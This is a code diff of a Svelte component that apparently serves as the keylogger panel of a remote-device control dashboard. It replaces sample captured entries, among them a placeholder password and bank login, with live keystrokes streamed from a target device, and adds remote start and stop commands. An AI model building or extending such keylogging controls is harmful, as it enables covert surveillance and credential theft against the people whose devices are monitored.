@@ -1,20 +1,32 @@
 <script lang="ts">
+	import { onDestroy } from 'svelte';
+	import type { createDeviceSocket } from '$lib/stores/deviceSocket';
+
+	export let socket: ReturnType<typeof createDeviceSocket>;
+
 	type KeylogEntry = { time: string; process: string; text: string };
 
 	let active = false;
-	let entries: KeylogEntry[] = [
-		{ time: '10:30:15', process: 'chrome.exe', text: 'admin@example.com' },
-		{ time: '10:30:28', process: 'chrome.exe', text: 'P@ssw0rd123' },
-		{ time: '10:31:45', process: 'notepad.exe', text: 'Important meeting notes' },
-		{ time: '10:32:10', process: 'slack.exe', text: 'Can you send me the report?' },
-		{ time: '10:35:42', process: 'outlook.exe', text: 'Meeting at 3pm tomorrow' },
-		{ time: '10:38:19', process: 'chrome.exe', text: 'https://secure-bank.com' },
-		{ time: '10:38:45', process: 'chrome.exe', text: 'username: john.doe' },
-		{ time: '10:39:02', process: 'chrome.exe', text: 'password: ********' }
-	];
+	let entries: KeylogEntry[] = [];
 
-	function toggleKeylogger() {
-		active = !active;
+	// ── Subscribe to live keylog push events ──────────────────────────────
+	const unsubKeylog = socket.onEvent('keylog', (payload) => {
+		const text = payload.data as string;
+		entries = [
+			...entries,
+			{
+				time: new Date().toLocaleTimeString(),
+				process: '(live)',
+				text
+			}
+		];
+	});
+	onDestroy(unsubKeylog);
+
+	async function toggleKeylogger() {
+		const kind = active ? 'keylog_stop' : 'keylog_start';
+		const result = await socket.sendCmd(kind);
+		if (result.ok) active = !active;
 	}
 
 	function downloadLog() {
@@ -57,14 +69,14 @@
 		<div class="btn-group">
 			<button class="start-btn" class:stop={active} on:click={toggleKeylogger}>
 				{#if active}
-					<svg width="11" height="11" viewBox="0 0 12 12" fill="currentColor">
-						<rect x="1" y="1" width="10" height="10" rx="1" />
-					</svg>
+					<svg width="11" height="11" viewBox="0 0 12 12" fill="currentColor"
+						><rect x="1" y="1" width="10" height="10" rx="1" /></svg
+					>
 					Stop Keylogger
 				{:else}
-					<svg width="11" height="11" viewBox="0 0 12 12" fill="currentColor">
-						<path d="M2 1l9 5-9 5V1z" />
-					</svg>
+					<svg width="11" height="11" viewBox="0 0 12 12" fill="currentColor"
+						><path d="M2 1l9 5-9 5V1z" /></svg
+					>
 					Start Keylogger
 				{/if}
 			</button>
